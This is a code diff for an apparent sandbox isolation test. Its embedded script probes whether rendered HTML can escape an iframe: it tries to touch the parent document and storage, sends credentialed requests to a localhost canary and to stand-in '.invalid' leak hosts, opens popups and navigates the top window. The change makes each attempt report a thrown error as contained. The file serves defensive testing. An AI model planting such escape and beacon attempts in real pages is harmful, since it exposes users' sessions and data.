@@ -6,21 +6,28 @@ const viewerToken = `${'v'.repeat(24)}.${'t'.repeat(43)}`;
 const authoredHtml = `<!doctype html><html><head><title>Isolated artifact</title></head><body>
   <h1>Rendered idea</h1>
   <script>
+    // Every escape attempt is individually guarded: engines disagree on
+    // whether a blocked capability returns null or throws (Firefox throws in
+    // places Chromium returns null), and an uncaught throw would kill the
+    // script before the probe report ever posts. A throw counts as
+    // containment, exactly like a null return.
     const probe = { origin: self.origin, parentReadable: false, parentStorage: false, popupOpened: false, topNavigationAssigned: false, fetchAttempted: false, xhrAttempted: false, imageAttempted: false };
     try { parent.document.body.dataset.rendererLeak = 'true'; probe.parentReadable = true; } catch {}
     try { parent.localStorage.setItem('renderer-canary', 'leaked'); probe.parentStorage = true; } catch {}
-    fetch('https://connect-canary.invalid/leak').catch(() => {});
+    try { fetch('https://connect-canary.invalid/leak').catch(() => {}); } catch {}
     probe.fetchAttempted = true;
     const appCanary = 'http://127.0.0.1:43873/api/v1/renderer-canary?run=' + encodeURIComponent(window.name);
-    fetch(appCanary, { credentials: 'include' }).catch(() => {});
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', appCanary);
-    xhr.withCredentials = true;
-    try { xhr.send(); } catch {}
+    try { fetch(appCanary, { credentials: 'include' }).catch(() => {}); } catch {}
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', appCanary);
+      xhr.withCredentials = true;
+      xhr.send();
+    } catch {}
     probe.xhrAttempted = true;
-    const image = new Image(); image.src = 'https://image-canary.invalid/leak';
+    try { const image = new Image(); image.src = 'https://image-canary.invalid/leak'; } catch {}
     probe.imageAttempted = true;
-    probe.popupOpened = window.open('https://popup-canary.invalid/leak') !== null;
+    try { probe.popupOpened = window.open('https://popup-canary.invalid/leak') !== null; } catch {}
     try { top.location = 'https://top-canary.invalid/leak'; probe.topNavigationAssigned = true; } catch {}
     parent.postMessage({ type: 'shelf:test-boundary', probe }, '*');
     addEventListener('load', () => {
